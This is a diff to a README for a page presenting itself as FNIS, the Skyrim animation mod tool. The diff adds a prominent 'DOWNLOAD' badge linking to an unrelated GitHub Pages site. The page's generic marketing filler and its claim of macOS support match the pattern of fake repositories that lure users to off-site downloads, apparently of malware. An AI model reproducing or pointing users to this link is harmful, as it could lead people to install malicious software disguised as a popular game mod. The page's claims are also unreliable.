@@ -30,6 +30,12 @@ FNIS (Fore's New Idles in Skyrim) is the foundational animation framework mod, e
 
 Whether you're a newcomer or a veteran, Fores New Idles in Skyrim provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Fores New Idles in Skyrim](https://img.shields.io/badge/⬇_DOWNLOAD_Fores+New+Idles+in+Skyrim-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
